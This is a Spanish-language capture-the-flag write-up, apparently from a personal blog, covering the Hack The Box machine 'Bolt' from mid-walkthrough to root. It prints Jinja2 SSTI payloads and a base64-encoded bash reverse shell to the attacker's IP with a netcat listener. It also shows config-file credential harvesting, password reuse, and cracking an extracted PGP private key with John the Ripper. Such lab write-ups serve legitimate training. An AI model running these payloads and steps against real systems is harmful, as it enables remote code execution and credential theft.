Antes de recorrer el sitio se me ocurri√≥ (como una prueba cualquiera) probar esas credenciales en el sitio `mail.bolt.htb`, solo testeando suerte, esto es lo que pas√≥:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_mail_inbox.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

CONSEGUIMOS ACCESO TAMBIEEEEEEEEEENNNNN! As√≠ que las cuentas que creemos en `demo.bolt.htb` son registradas tambi√©n en `mail.bolt.htb` (curioso) (: Ahora si sigamos que tenemos mucho para enumerar.

...

Jugando con `mail.bolt.htb` y el servidor de correo [Roundcube](https://es.wikipedia.org/wiki/Roundcube), podemos buscar alguna versi√≥n o detalle extra que nos sirva para averiguar m√°s acerca de √©l, si nos fijamos en la parte izquierda inferior hay un s√≠mbolo de interrogaci√≥n con la palabra `About`, si damos click llegamos ac√°:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_mail_inbox_about.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Tenemos la versi√≥n del **Roundcube** y algunos plugins instalados, solo que buscando y buscando no logramos encontrar nada √∫til contra esto :'( Vayamos a enumerar `demo.bolt.htb`.

Despu√©s de muuuuchos pasos en falso, formularios que no hacen nada y miradas perdidas, encontramos este apartado:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_demo_adminProfile_settings.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

¬øPor qu√© es llamativo? Tiene una descripci√≥n relacionada con emails ¬øno es eso lo que estamos buscando?

> Email verification is required in order to update personal information.

Y es que si le damos sentido a esa descripci√≥n, cobra valor el servidor de correo al que tenemos acceso ¬øno? ((email verification **(!)**))

As√≠ que agregamos data X en los campos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_demo_adminProfile_settings_WITHdataX.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Click en **submit**... Y no pasa nada...

PEEEEEEEEEEERO:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_mail_inbox_newMAIL.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 70%;"/>

Efectivamente, nos lleg√≥ un correo, a veeeeeeerlo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_mail_inbox_newMAIL_inside.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Pide confirmar los cambios hechos en el perfil, demos click en el link a ver que pasa...

Nos abre una nueva pesta√±a contra la direcci√≥n `http://demo.bolt.htb/admin/profile` yyyyyy en el servidor de correo volvemos a obtener un mail, esta vez con este contenido:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_mail_inbox_newMAIL_carlitos.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Jmmmmmm, √∫nicamente nos muestra el nuevo username de nuestro perfil. Esto nos da riendas a probar cositas, ya que si nos devuelve lo que escribimos en `Name` (nombre de usuario) podr√≠amos generar alg√∫n tipo de inyecci√≥n o error, para que cuando nos llegue el correo (si es que se genera la explotaci√≥n) pues nos muestre cositas locas (:

# Explotaci√≥n [#](#explotacion) {#explotacion}

Jugamos cambiando nuestro nombre a `'`, a `"`, a `<h1>carlitos</h1>` y esta inyecci√≥n nos confirma HTML injection:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_mail_inbox_newMAIL_H1carlitosH1.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Podemos probar XSS, pero poco hacemos con esto, probando m√°s cositas record√© la hermosa **SSTI** ([**Server Side Template Injection**](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)), que b√°sicamente le permite a un atacante inyectar contenido dentro de un template, permitiendo as√≠ que el servidor lo ejecute (:

* [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).
* [SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

De los dos recursos de arriba podemos extraer algunos payloads a probar, como por ejemplo:

{% raw %}
```python
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

La idea con esos payloads es que si la inyecci√≥n se genera, deber√≠a hacer la operaci√≥n matem√°tica, por lo que deber√≠a devolvernos (repito, en caso de que sea vulnerable) el n√∫mero `49` como nuevo nombre modificado :P

As√≠ que probemos, tomamos inicialmente `{{7*7}}`, modificamos, confirmamos cambios yyyyyyyyyyyyyyyyyy:
{% endraw %}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_mail_inbox_newMAIL_confirmSSTI.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

¬øSe ve algo distinto? (gui√±o)

TENEMOS EL N√öMERO 49!!!!!!!!!!! As√≠ que confirmamos que tenemos una inyecci√≥n tipo **SSTI** (:

El siguiente paso despu√©s de esto es identificar que tipo de template tenemos, ya que hay muuuuuchos y todos difieren... Citemos esta parte de uno de los [recursos de arriba](https://portswigger.net/research/server-side-template-injection):

{% raw %}
> The probe `{{7*'7'}}` would result in **49** in <u>Twig</u>, **7777777** in <u>Jinja2</u>, and neither if no template language is in use.
{% endraw %}

As√≠ que intentemos ahora ese payload:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_mail_inbox_newMAIL_confirmSSTI_Jinja2.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

{% raw %}
Listooooos, con respecto a la anterior cita, ahora sabemos que el template que tenemos esta basado en `Jinja2`! Lo loco de todo esto es que no solo nos sirve para inyectar y reflejar n√∫meros (tambi√©n podemos ver variables de entorno, cositas como la configuraci√≥n de la app (`{{config}}`), bueno, varias vainas), nop, tambi√©n podemos ejecutar comandos de forma remotaAAAAAAAAAAAAAAAA :O

Antes de probar RCE, entrenen el ojo encontrando credenciales y data fr√°gil al poner `{{config}}` como nuestro nombre de usuario:
{% endraw %}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384page80_mail_inbox_newMAIL_SSTI_config.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

:P

Ahora s√≠, busquemos maneras de conseguir RCE...

Gui√°ndonos de [uno de los recursos reci√©n citados](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) tenemos este apartado:

* [SSTI (Jinja2) - Remote Code Execution](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-remote-code-execution).

Entre tooodas las opciones, podemos tomar esta y modificarla:

{% raw %}
```jinja2
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```
{% endraw %}

Para evitar problemas en la interpretaci√≥n, pasemos nuestro payload (una **reverse Shell** en este caso) a `base64` y en los comandos inyectados le decimos que lo decodee y lo interprete, el paso a paso ser√≠a este:

Pasamos el payload a `base64`:

```bash
‚ù± echo "bash -i >& /dev/tcp/10.10.14.11/4433 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS80NDMzIDA+JjEK
```

En √©l le decimos que apenas se conecte al puerto `4433` de nuestra m√°quina nos lance una `bash` (:

Levantemos ese puerto:

```bash
‚ù± nc -lvp 4433
listening on [any] 4433 ...
```

Ahora simplemente le damos forma a la inyecci√≥n:

{% raw %}
```jinja2
{{config.__class__.__init__.__globals__['os'].popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS80NDMzIDA+JjEK | base64 -d | bash').read()}}
```
{% endraw %}

As√≠ que tomara la cadena, la decodeara y la interpretar√°, cuando la int√©rprete generar√° nuestra **Reverse Shell** (si es que sirve :P)...

Modificamos, confirmamos yyy al momento de confirmar pasa esto en nuestra terminal:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_wwwdata_RevSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

PERFECTOOOOOOOOOWOWOWOWOEOWEOEIJfsadojflkajfl, hemos conseguido acceso al sistema explotando un **Server Side Template Injection** (:

...

Ahora jugamos con nuestra terminal para hacerla m√°s linda y din√°mica: nos permitir√° tener hist√≥rico de comandos, movernos entre ellos y hacer `CTRL+C` sin miedo a perder la Shell (:

* [Tratamiento de la TTY](https://lanzt.gitbook.io/cheatsheet-pentest/tty).

Sigamos con la m√°quina...

¬øQu√© usuarios existen en el sistema? Veamos:

```bash
www-data@bolt:/demo$ ls -la /home
total 16
drwxr-xr-x  4 root  root  4096 Mar  3  2021 .
drwxr-xr-x 19 root  root  4096 Jan 26 07:14 ..
drwxr-x--- 15 clark clark 4096 Feb 25  2021 clark
drwxr-x--- 16 eddie eddie 4096 Feb  2 12:27 eddie
```

Bien, si encontramos credenciales, llaves, cadenas extra√±as, lo que sea, podemos probarlo contra ellos a ver si conseguimos una Shell (:

Cuando conseguimos la reverse Shell llegamos a este directorio:

```bash
www-data@bolt:~/demo$ pwd
/var/www/demo
www-data@bolt:~/demo$ ls -la
total 36
drwxr-xr-x 5 www-data www-data 4096 Aug  4 13:06 .
drwxr-xr-x 6 root     root     4096 Aug  4 13:06 ..
-rw-r--r-- 1 www-data www-data 6399 Mar  6  2021 app.py
-rw-r--r-- 1 www-data www-data  420 Mar  4  2021 config.py
drwxr-xr-x 2 www-data www-data 4096 Mar  6  2021 __pycache__
drwxr-xr-x 3 www-data www-data 4096 Mar  4  2021 static
drwxrwxr-x 6 www-data www-data 4096 Mar  5  2021 templates
-rw-r--r-- 1 www-data www-data   62 Mar  4  2021 wsgi.py
```

¬øSi vieron las credenciales antes? Pues ac√° est√°n de nuevo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_wwwdata_credsMYSQL_configPY.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Tenemos usuario y contrase√±as de la base de datos `boltmail`, son v√°lidas, pero dentro no encontramos nada √∫til o que no tengamos ya, as√≠ que sigamos enumerando...

> ```bash
> www-data@bolt:~/demo$ mysql -u bolt_dba -D boltmail -p
> ```

Sali√©ndonos un directorio existen estos objetos a los que `www-data` tiene acceso:

```bash
www-data@bolt:~$ ls -la
total 24
drwxr-xr-x  6 root     root     4096 Aug  4 13:06 .
drwxr-xr-x 14 root     root     4096 Jan 26 07:14 ..
drwxr-xr-x  5 www-data www-data 4096 Aug  4 13:06 demo
drwx------  7 www-data www-data 4096 Aug 26 23:57 dev
drwxr-xr-x  2 root     root     4096 Aug  4 13:06 html
drwx------ 13 www-data www-data 4096 Aug  4 13:06 roundcube
```

Dando vueltas volvemos a encontrar credenciales, ahora de la base de datos `rouncube` (la del servidor de correo):

```bash
www-data@bolt:~/roundcube/config$ pwd
/var/www/roundcube/config
www-data@bolt:~/roundcube/config$ cat config.inc.php
<?php
...
$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
...
$config['des_key'] = 'tdqy62YPNdGEeohXtJ2160bX';
...
```

Pero igual, no hay nada interesante...

Despu√©s de unos minutos record√© con lo que lidiamos antes del puerto `443`, el servicio **Passbolt**, pues busquemos archivos en el sistema con ese nombre a ver si por ah√≠ encontramos algo.

```bash
www-data@bolt:/$ find / -name passbolt 2>/dev/null
/etc/passbolt
/usr/share/php/passbolt
/usr/share/passbolt
/var/lib/passbolt
/var/log/passbolt
```

Bien, hay cositas, pues empecemos por el principio :P

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_wwwdata_ls_etcPASSBOLT.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Recorriendo algunos de los objetos notamos estas credenciales de nuevo de una base de datos, esta vez llamada `passboltdb` (ya hab√≠amos lidiado con **passbolt** en el puerto **443**, tengamos esto en cuenta por si algo):

```bash
www-data@bolt:/etc/passbolt$ cat passbolt.php
<?php
...
    // Database configuration.
    'Datasources' => [
        'default' => [
            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',
        ],
    ],
...
```

Prob√°ndolas contra **MySQL** son v√°lidas, peeeeeeeeeero si tambi√©n jugamos a reutilizarla contra el sistema ya sea con `eddie` o `clark`, tenemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_eddieSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

TENEMOS UNA TERMINAAAAAAAAAAAAAL como el usuario `eddie` (((: Veamos que sigueeee...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Antes de volvernos locos enumerando, veamos la base de datos (:

```bash
eddie@bolt:~$ mysql -u passbolt -D passboltdb -p
```

Tenemos algunas tablas llamativas:

```sql
mysql> show tables;
+-----------------------+
| Tables_in_passboltdb  |
+-----------------------+
| account_settings      |
| action_logs           |
| actions               |
| authentication_tokens |
...
| gpgkeys               |
...
| secret_accesses       |
| secrets               |
| secrets_history       |
| user_agents           |
| users                 |
+-----------------------+
```

De primeras contra `users` vemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_mysql_passboltdb_users.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Nada √∫til, jugando con las otras tablas llegamos a `secrets`, tenemos esta data:

```sql
mysql> SELECT * FROM secrets;
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_mysql_passboltdb_secrets.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

ü§´ ***Secret endpoints are used to manage secrets on a Resource.*** [Secret - Passbolt](https://help.passbolt.com/api/secrets)

Simple y directo, son secretos!

(B√°sicamente, son datos que est√°n almacenados como "privados" dentro de `passbolt`, entre ellos puede haber credenciales, n√∫meros bancarios, de tel√©fono, etc. Todo tipo de dato que quieras privatizar.)

Interesante, el mismo post citado antes nos indica que podemos revertir el secreto para que ya no sea un "secreto":

```bash
$ echo "<encrypted_token_from_server>" | gpg -d
```

As√≠ que probemos, tomamos el secreto, lo guardamos en un archivo y ejecutamos:

```bash
‚ù± cat secret.asc | gpg -d
gpg: cifrado con clave RSA, ID F65CA879A3D77FE4
gpg: descifrado fallido: No tenemos la clave secreta
```

Jmmmm, pues buscando por internet debemos primero importar la llave privada relacionada con ese secreto :O Pos paila, no tenemos eso... Tengamos esto por si algo, suena llamativo.

...

Buscando archivos asociados a `eddie` encontramos un correo enviado por `clark`:

```bash
eddie@bolt:~$ find / -user eddie 2>/dev/null
...
/var/mail/eddie
...
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_cat_eddieMail.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Se habla de una llave privada (ojito) que es necesaria para "recuperar" una cuenta de `passbolt` YYYY **Clark** le indica a **Eddie** que haga un backup (m√°s ojito a√∫n) de la llave... (Adem√°s, que **Clark** le pide que tenga atenci√≥n en la seguridad que esto conlleva (interesante)).

Bien, pues pueda que ese "backup" ya exista YY que -exista- en el sistema, as√≠ que enfoqu√©monos en buscarlo.

```bash
eddie@bolt:~$ grep -rani "private" .
```

¬øSe ve, no? :O

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_grep_PGPrivateKEYfound.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Exaaaaaaaaaaaacto, hay una llave privada!! El archivo donde esta es este:

```bash
/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log
```

Pues copi√©mosla y pegu√©mosla en un archivo de nuestro sistema, as√≠ posteriormente intentaremos jugar con ella... Al copiarla queda con este formato:

```bash
‚ù± cat llavedeleddie.keyphp
-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment:
...
```

Los saltos de l√≠nea no son interpretados, hay muuuchas maneras de solucionar esto, una de ellas es con `vim`. Abrimos el archivo, entramos a su terminal y ejecutamos:

```vim
%s/\\\\r\\\\n/\r/g
```

Ya nos va a quedar el archivo bien lindo:

```bash
‚ù± cat llavedeleddie.keypgp
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk
...
```

Ahora s√≠, sigamos... 

Recuerdas que antes al intentar ver el "secreto" nos ped√≠a importar una llave privada, probemos con esta a ver khe:

```bash
‚ù± gpg --import llavedeleddie.keypgp
```

Yyyy nos muestra esta ventana:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_gpg_importPrivKey_withoutPW.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Pailas, nos pide una contrase√±a para seguir el proceso :'( A seguir con nuestra enumeraci√≥n...

Buscando por internet que hacer con este tipo de llaves y si es posible crackearlas llegamos a este post:

* [Cracking PGP symmetrically encrypted files with JtR](https://www.openwall.com/lists/john-users/2015/11/17/1).

üîí ***GNU Privacy Guard** (GnuPG o GPG) es una herramienta de cifrado y firmas digitales*** [GNU Privacy Guard](https://es.wikipedia.org/wiki/GNU_Privacy_Guard) (por si se lo preguntaban :P)

En s√≠ la llave no es crackeable, peeeero pasando el contenido a un hash que entienda `JohnTheRipper (JtR)` podemos intentar romper y descubrir el contenido en texto plano de la llave :O, ser√≠a as√≠:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_gpg2john_hashPrivKey.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

As√≠ que generamos el hash y simplemente lo guardamos en un objeto (: Ahora le indicamos a `john` que intente romperlo. Despu√©s de muuuuuuuuchos minutos vemos esto:

```bash
‚ù± john --wordlist=/usr/share/wordlists/rockyou.txt hashdeleddie.hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
...
merrychristmas   (Eddie Johnson)
...
Session completed
```

Opa opa opaaaaaa, tenemos una contrase√±aaaaa√±a√±a√±aa√±a√±aaaaaa, lo primero es jugar con reutilizaci√≥n de contrase√±as (siempre, parece sencilla y b√°sica, pero nunca se sabe):

```bash
eddie@bolt:~$ su clark
Password: 
su: Authentication failure
eddie@bolt:~$ su
Password: 
su: Authentication failure
```

Nada... Ahora reintentemos importar la llave privada de `eddie` para posteriormente jugar con el "secreto":

```bash
‚ù± gpg --import llavedeleddie.keypgp
```

Nos vuelve a pedir la contrase√±a, indicamos `merrychristmas` yyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_gpg_importPrivKey_withPW.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

PEEEEEEEEEEERFECTO, ahora si nos dej√≥, si validamos las llaves del sistema, tenemos la reci√©n agregada:

```bash
‚ù± gpg --list-keys
...
-----------------------------
pub   rsa2048 2021-02-25 [SC]
      DF426BC7A4A8AF58E50EDA0E1C2741A3DC3B4ABD
uid        [desconocida] Eddie Johnson <eddie@bolt.htb>
sub   rsa2048 2021-02-25 [E]
```

Ya con la llave privada importada, retomemos la idea de recuperar nuestro "secreto" (uajaja):

```bash
‚ù± cat secret.asc | gpg -d
```

La respuesta es distinta:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_gpg_decryptSecret_popup.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Colocamos de nuevo `merrychristmas` como contrase√±a y y yyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384bash_gpg_decryptSecret_done.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

HAY UNA CONTRASE√ëA dentro del SECRETOOOOOOOOOOOOOOOOO! Solo nos queda probarla en todos los sitios (: Inicialmente en el sistema:

```bash
eddie@bolt:~$ su clark
Password: 
su: Authentication failure
eddie@bolt:~$ su
Password: 
root@bolt:/home/eddie# whoami; hostname
root
bolt.htb
```

Y tenemos una terminal como el usuario `root` ((((((: Bastante fresco, veamos las flags...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bolt/384flags.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Y nada, hasta la pr√≥xima.

### Aporte final, me gusto su uso (y pa que no se me pierda :P)

As√≠ podemos listar objetos entre dos fechas:

```bash
‚ù± find . -newermt "2019-01-01" ! -newermt '2019-12-01'
```

...

Me pareci√≥ muuuuuuuuuuy brutal el path hasta el user, una cosita de locos :P El Geek esta demente (: Me gusto mucho la m√°quina.

Y bueno, nos leeremos en la otra biblia, se me cuidan y descansen! Pero recuerden que hay que seguir rompiendo todo!!!!!!